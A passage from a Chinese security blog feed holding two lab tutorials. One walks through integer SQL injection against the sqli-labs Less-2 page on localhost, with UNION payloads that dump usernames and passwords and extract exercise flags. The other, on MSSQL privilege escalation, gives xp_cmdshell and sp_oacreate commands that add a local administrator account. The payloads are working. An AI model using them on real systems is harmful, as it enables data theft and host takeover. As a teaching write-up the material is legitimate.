src=\"image-20220928215359897.png\" alt=\"image-20220928215359897\"></p>\n<p>发现成功令报错信息中 near 'xxxxx’中的 LIMIT 前一个符号发生改变。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#如果是整型注入，加入单引号会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span><span class=\"string\">&#x27; limit 0,1</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#如果是单引号注入，加入单引号也会报错</span></span><br><span class=\"line\"><span class=\"string\">select username,password from user where id = &#x27;</span><span class=\"number\">2</span><span class=\"string\">&#x27;&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>据目前输入的结果来看，此网页存在 “整型注入” 或者 “单引号注入”</p>\n<h4 id=\"3输入的sql语句能否不报错\"><a class=\"markdownIt-Anchor\" href=\"#3输入的sql语句能否不报错\">#</a> 3) 输入的 SQL 语句能否不报错</h4>\n<p>为了查看我们的语句能够成功闭合</p>\n<p>那怎么区分到底是整型还是单引号呢？</p>\n<p>使用 # 来注释后面语句</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#加入#号后，两个语法依旧错误，故都会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span><span class=\"string\">&#x27; # limit 0,1</span></span><br><span class=\"line\"><span class=\"string\">select username,password from user where id = &#x27;</span><span class=\"number\">2</span><span class=\"string\">&#x27; #&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>结果确实是报错。</p>\n<p><img src=\"image-20220928220327744.png\" alt=\"image-20220928220327744\"></p>\n<p>接下来我们删掉单引号</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#如果是整型注入，则删掉单引号，保留#号后，不会报错！</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span> # limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">#如果是单引号注入，则删掉单引号，保留#号后，依旧会报错</span><br><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"string\">&#x27;2 #&#x27;</span> limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928220529170.png\" alt=\"image-20220928220529170\"></p>\n<h3 id=\"2什么类型的注入\"><a class=\"markdownIt-Anchor\" href=\"#2什么类型的注入\">#</a> ②什么类型的注入</h3>\n<p>因此，此处经过上述报错信息确定，存在<strong>整型注入</strong>！</p>\n<h3 id=\"3语句是否能够被恶意修改\"><a class=\"markdownIt-Anchor\" href=\"#3语句是否能够被恶意修改\">#</a> ③语句是否能够被恶意修改</h3>\n<p>恶意修改主要指能否再加入一些我们想要的判断条件，比如：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> username,password <span class=\"keyword\">from</span> <span class=\"keyword\">user</span> <span class=\"keyword\">where</span> id <span class=\"operator\">=</span> <span class=\"number\">2</span> <span class=\"keyword\">and</span> <span class=\"number\">0</span># limit <span class=\"number\">0</span>,<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n<p>如果是整型注入无误，这里条件为 “id = 2 and 0”—— 这是永假条件，则不会有任何查询结果。</p>\n<p><img src=\"image-20220928221547372.png\" alt=\"image-20220928221547372\"></p>\n<p>结果正如我们所料，空空如也。</p>\n<h3 id=\"4是否能够成功执行\"><a class=\"markdownIt-Anchor\" href=\"#4是否能够成功执行\">#</a> ④是否能够成功执行</h3>\n<p>第三个能满足，其实第四个就顺带就 OK。</p>\n<h3 id=\"5获取我们想要的数据\"><a class=\"markdownIt-Anchor\" href=\"#5获取我们想要的数据\">#</a> ⑤获取我们想要的数据</h3>\n<p>关键数据是保存在数据库里面的，关系如下：</p>\n<p>数据库 -&gt; 表 -&gt; 字段 -&gt; 值</p>\n<p>打开 MySQL，我们可以看到其中有 information_schema 库（这是 MySQL 自带的库，管理所有表信息）</p>\n<p><img src=\"image-20220928223622076.png\" alt=\"image-20220928223622076\"></p>\n<p>这个库中有三个表非常值得我们关注：</p>\n<p>Schemata 表（包含所有的 <code>库名信息</code> ）、Tables 表（包含所有的 <code>表名信息</code> ）、Columns 表（包含所有的 <code>列名信息</code> ）</p>\n<p><strong>首先是 Schemeta 表</strong>， <code>schema_name</code>  对应着所有数据库的名字。</p>\n<p><img src=\"image-20220928224006640.png\" alt=\"image-20220928224006640\"></p>\n<p><strong>其次是 Tables 表</strong>， <code>table_name</code>  这个列里，存储了 <code>table_schema对应的库</code> 下面的所有表</p>\n<p><img src=\"image-20220928224135720.png\" alt=\"image-20220928224135720\"></p>\n<p><strong>最后是 Columns 表</strong>，通过 <code>table_schema</code>  对应的库， <code>table_name</code>  对应的表，<strong>使用 column_name 对应的列名，来唯一地定位某个列</strong>。</p>\n<p><img src=\"image-20220928224405698.png\" alt=\"image-20220928224405698\"></p>\n<h4 id=\"1构造联合查询\"><a class=\"markdownIt-Anchor\" href=\"#1构造联合查询\">#</a> 1）构造联合查询</h4>\n<p>确定的整型注入中，我们需要构造出我们想要的查询内容，比如在<strong> information_schema 库</strong>的<strong> Schema 表</strong>中获取 <code>schema_name</code> ：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225341595.png\" alt=\"image-20220928225341595\"></p>\n<p>但如果像上面这样构造，会报错，我们需要使用到联合查询。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225106827.png\" alt=\"image-20220928225106827\"></p>\n<p>但是，如果像上面这样构造，依旧会报错，在 SQL 查询中，union 前后的两个列 ++<strong> 需要列数完全一致才可拼接</strong> ++。</p>\n<p>因此，需要使用占位符来定位前面的查询是多少列：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#占位一个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span> #</span><br><span class=\"line\">#占位两个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span> #</span><br><span class=\"line\">#占位三个，后面的代码用#注释掉</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span> #</span><br><span class=\"line\">....</span><br></pre></td></tr></table></figure>\n<p>注意，这里的 1,2,3 可以填任何数字或者符号，仅仅为了占位使用，<strong>可以被任意 “想要看到的输出内容” 覆盖</strong>。</p>\n<p>经过多次定位，我们最终得到：<strong>前面的查询</strong>使用到的是<strong> 3 个列</strong>。</p>\n<p><img src=\"image-20220928225313035.png\" alt=\"image-20220928225313035\"></p>\n<p>因此有：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">3</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225608030.png\" alt=\"image-20220928225608030\"></p>\n<p>虽然正确显示，但是我们查询的内容并没有显示出来。这是因为，使用 union 查询，<strong>还有个 bug</strong> 就是如果前面的查询有效，<strong>最终结果会在前面查询到的结尾后面拼接</strong>。</p>\n<p>为了让后面查询到的内容（我们 <code>想要看到的数据</code> ）提前，<strong>我们需要令前面的查询失效</strong>，简单的方法就是令 id = 39888 这样平常不会使用的奇怪数字：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, <span class=\"number\">2</span>, schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928225926603.png\" alt=\"image-20220928225926603\"></p>\n<h4 id=\"2拼接多组内容在同一行输出-寻找所在库\"><a class=\"markdownIt-Anchor\" href=\"#2拼接多组内容在同一行输出-寻找所在库\">#</a> 2）拼接多组内容在同一行输出、寻找所在库</h4>\n<p>OK，我们在第二个占位符（也就是数字 2 所在的位置）上，看到输出了一个 schema_name，但是我们想要输出所有的 schema_name，怎么办？</p>\n<p>使用 MySQL 查询语句提供的 group_concat () 函数</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(schema_name), schema_name <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p>可以看到，原本占位符 2 所在的位置，已经被一组输出内容所替换。</p>\n<p><img src=\"image-20220928230746841.png\" alt=\"image-20220928230746841\"></p>\n<p>除了 group_concat ()，我们还可以使用：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#输出当前使用数据库的名称</span><br><span class=\"line\">database() </span><br><span class=\"line\">#输出当前服务器中使用数据库的用户的名字和其对应的主机</span><br><span class=\"line\"><span class=\"keyword\">user</span>()</span><br><span class=\"line\">#输出当前数据库版本号</span><br><span class=\"line\">version()</span><br><span class=\"line\">#输出该服务器数据库安装路径（数据库安装在哪里）</span><br><span class=\"line\">@<span class=\"variable\">@basedir</span></span><br><span class=\"line\">#输出数据库中数据的存放路径（该存放路径下有各个数据库的数据、数据库中表的数据）</span><br><span class=\"line\">@<span class=\"variable\">@datadir</span></span><br><span class=\"line\">#输出操作系统的版本号</span><br><span class=\"line\">@<span class=\"variable\">@version</span>_compile_os</span><br><span class=\"line\">#md5(str)可以对传入的字符串进行，d5加密，并返回加密后得到的<span class=\"number\">32</span>位字符串。</span><br><span class=\"line\">md5(<span class=\"string\">&#x27;xxxx&#x27;</span>)</span><br><span class=\"line\">#使用某个拼接符如“:”来拼接str1和str2</span><br><span class=\"line\">concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, str1, str2)</span><br></pre></td></tr></table></figure>\n<p>接着我们查询所在数据库的名字：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(schema_name), database() <span class=\"keyword\">from</span> information_schema.schemata #</span><br></pre></td></tr></table></figure>\n<p>哦，原来是在 security 数据库中</p>\n<p><img src=\"image-20220928231402676.png\" alt=\"image-20220928231402676\"></p>\n<h4 id=\"3确定想从某个库中拿到什么表从表中拿到什么列\"><a class=\"markdownIt-Anchor\" href=\"#3确定想从某个库中拿到什么表从表中拿到什么列\">#</a> 3）确定想从某个库中拿到什么表，从表中拿到什么列</h4>\n<p>我们看看从 security 库中都可以读取什么表？</p>\n<p><strong>核心</strong> —— 在<strong> information_schema 库</strong>的<strong> Tables 表</strong>中，查询当 table_schema 的值为我们刚刚获取的 security 库时</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(table_name), database() <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema <span class=\"operator\">=</span> database() #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928231639522.png\" alt=\"image-20220928231639522\"></p>\n<p><strong>获取到 security 库中的所有表为</strong>： <code>emails</code> 、 <code>referers</code> 、 <code>uagents</code> 、 <code>users</code></p>\n<p>我们比较关心账号密码相关，所以眼光聚焦到 users 表。</p>\n<p><strong>核心</strong> —— 在<strong> information_schema 库</strong>的<strong> Columns 表</strong>中，查询当<strong> table_schema</strong> 的值为我们刚刚获取的 <code>security</code>  且 <strong>table_name</strong> 为 <code>users</code>  时</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(column_name), database() <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_schema <span class=\"operator\">=</span> database() <span class=\"keyword\">and</span> table_name <span class=\"operator\">=</span> <span class=\"string\">&#x27;users&#x27;</span> #</span><br></pre></td></tr></table></figure>\n<p><strong>获取到 security 库中，users 表里所有列为</strong>： <code>id</code> 、 <code>username</code> 、 <code>password</code></p>\n<p><img src=\"image-20220928232355430.png\" alt=\"image-20220928232355430\"></p>\n<p>我们想要获取 username 和 password 的全部对应关系，使用 concat_ws 函数，把 username 和 password 用冒号拼接起来：</p>\n<p><strong>核心</strong> —— 由于已经知道了所在<strong> security 库</strong>，<strong>users 表</strong>，因此直接 <code>select xxxx from security.users</code></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>sqli<span class=\"operator\">/</span>Less<span class=\"number\">-2</span><span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">39888</span> <span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>, group_concat(concat_ws(<span class=\"string\">&#x27;:&#x27;</span>, username, password)), <span class=\"number\">3</span> <span class=\"keyword\">from</span> security.users #</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220928232842359.png\" alt=\"image-20220928232842359\"></p>\n<p>小练习</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#<span class=\"number\">1.</span>查看注入类型</span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-1.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span></span><br><span class=\"line\">http:<span class=\"operator\">/</span><span class=\"operator\">/</span><span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span><span class=\"operator\">/</span>SQLC<span class=\"operator\">/</span><span class=\"keyword\">sql</span><span class=\"number\">-1.</span>php<span class=\"operator\">/</span>?id<span class=\"operator\">=</span><span class=\"number\">1</span><span class=\"string\">&#x27; # 报错(整型和单引号都会报错)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#2.确定整型注入</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=1 # (只有整型不会报错)</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#3.确定列数</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=1 union select 1, 2, 3 #</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: kevin</span></span><br><span class=\"line\"><span class=\"string\">Password: Kevin</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#4.构造联合查询,确定所在库名。</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), schema_name from information_schema.schemata #</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: information_schema</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#5.确定在这个库中，都有什么表</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(table_name) from information_schema.tables where table_schema = database()#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: emails,flag,users</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#6.确定我们要找flag表，并看这个表中有什么列</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=12345 union select 1, database(), group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = &#x27;</span>flag<span class=\"string\">&#x27;#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: flag,value</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">#7.取列的值，另外把查询的from 后面改成对应的&quot;库.表&quot;</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/SQLC/sql-1.php/?id=2356 union select 1,database(), group_concat(concat_ws(&#x27;</span>:<span class=\"string\">&#x27;, flag, value)) from challenge.flag#</span></span><br><span class=\"line\"><span class=\"string\">-----结果-----</span></span><br><span class=\"line\"><span class=\"string\">Username: challenge</span></span><br><span class=\"line\"><span class=\"string\">Password: flag1:mars,flag2:coobe,flag3:gir,flag4:margin,flag5:tubi,flag6:xss,flag7:any,flag8:sqlc,flag9:tasi,flag10:moo,flag12:false,flag11:muse</span></span><br></pre></td></tr></table></figure>\n<p>至此，整型注入演示完毕。</p>\n",
            "tags": [
                "SQL注入探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "url": "https://kiyomijin.github.io/2022/09/27/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/MSSQL%E6%8F%90%E6%9D%83%E6%94%BB%E5%87%BB/",
            "title": "MSSQL提权攻击",
            "date_published": "2022-09-27T14:46:06.000Z",
            "content_html": "<h1 id=\"sql-servermssql提权\"><a class=\"markdownIt-Anchor\" href=\"#sql-servermssql提权\">#</a> SQL Server（MSSQL）提权</h1>\n<p>总结一下，下文使用有效命令全部为：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--1.xp_cmdshell提权</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span>,<span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\">#master..xp_cmdshell的全写是master.dbo.xp_cmdshell</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net user HeyJack HeyJack /add&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;net localgroup administrators HeyJack /add&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;ipconfig&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;type C:\\Documents and Settings\\桌面\\flag.txt&#x27;</span>;</span><br><span class=\"line\"><span class=\"comment\">--恢复语句</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span> ,<span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--2.sp_oacreate提权</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ole Automation Procedures&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">declare</span> <span class=\"variable\">@shell</span> <span class=\"type\">int</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>, <span class=\"variable\">@shell</span> output;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>, <span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c net user HeyJack1 HeyJack1 /add&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">declare</span> <span class=\"variable\">@shell</span> <span class=\"type\">int</span>;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oacreate <span class=\"string\">&#x27;wscript.shell&#x27;</span>, <span class=\"variable\">@shell</span> output;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_oamethod <span class=\"variable\">@shell</span>, <span class=\"string\">&#x27;run&#x27;</span>,<span class=\"keyword\">null</span>,<span class=\"string\">&#x27;c:\\windows\\system32\\cmd.exe /c net localgroup administrators HeyJack1 /add&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">--恢复语句</span></span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;Ole Automation Procedures&#x27;</span>, <span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">0</span>;reconfigure;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">--3.沙盒提权(不常用，所以没粘贴出来)</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"0x01-环境准备\"><a class=\"markdownIt-Anchor\" href=\"#0x01-环境准备\">#</a> 0x01 环境准备</h2>\n<p>输入用户名和密码，以 <code>sa</code>  身份登录 SQL Server2005</p>\n<p><img src=\"image-20220927205858375.png\" alt=\"image-20220927205858375\"></p>\n<p>登录后可以看到这样的界面</p>\n<p><img src=\"image-20220927210049933.png\" alt=\"image-20220927210049933\"></p>\n<p>首先我们了解下什么是 sp_configure？</p>\n<p><img src=\"image-20220927210431221.png\" alt=\"image-20220927210431221\"></p>\n<p>其中，在列出高级配置选项的例子中，官网显示了如何设置和列出所有配置选项：首先就是要设置 <code>show advanced options</code>  为 <code>1</code> ，可以显示高级选项。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">USE master;  </span><br><span class=\"line\">GO  </span><br><span class=\"line\"><span class=\"keyword\">EXEC</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>;  </span><br></pre></td></tr></table></figure>\n<p>sp_configure 的作用是显示或更改当前服务器的全局配置的高级选项，执行成功返回 0，失败返回 1，其中高级选项中包含 cmdshell 等。</p>\n<h2 id=\"0x02-xp_cmdshell提权步骤\"><a class=\"markdownIt-Anchor\" href=\"#0x02-xp_cmdshell提权步骤\">#</a> 0x02 xp_cmdshell 提权步骤</h2>\n<h3 id=\"1第一步更改当前服务器的全局配置首选高级选项为1\"><a class=\"markdownIt-Anchor\" href=\"#1第一步更改当前服务器的全局配置首选高级选项为1\">#</a> ①第一步，更改当前服务器的全局配置首选高级选项为 1</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">#以下大写字母均可小写</span><br><span class=\"line\"><span class=\"keyword\">EXEC</span> sp_configure <span class=\"string\">&#x27;show advanced options&#x27;</span>, <span class=\"number\">1</span>;RECONFIGURE;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927211220768.png\" alt=\"image-20220927211220768\"></p>\n<p>使用鼠标选中一行，然后右键选择执行</p>\n<p><img src=\"image-20220927211614093.png\" alt=\"image-20220927211614093\"></p>\n<h3 id=\"2第二步打开cmd-shell\"><a class=\"markdownIt-Anchor\" href=\"#2第二步打开cmd-shell\">#</a> ②第二步，打开 cmd-shell</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> sp_configure <span class=\"string\">&#x27;xp_cmdshell&#x27;</span>, <span class=\"number\">1</span>;reconfigure;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927211736845.png\" alt=\"image-20220927211736845\"></p>\n<h3 id=\"3第三步输入你想执行的windows-cmd命令\"><a class=\"markdownIt-Anchor\" href=\"#3第三步输入你想执行的windows-cmd命令\">#</a> ③第三步，输入你想执行的 windows cmd 命令。</h3>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">exec</span> master..xp_cmdshell <span class=\"string\">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20220927211958154.png\" alt=\"image-20220927211958154\"></p>\n<p>言归正传，我们为系统添加属于 <code>攻击者自己的net user账户</code>  (主要目的是使用已知的用户名和密码)</p>\n<figure class=\"highlight 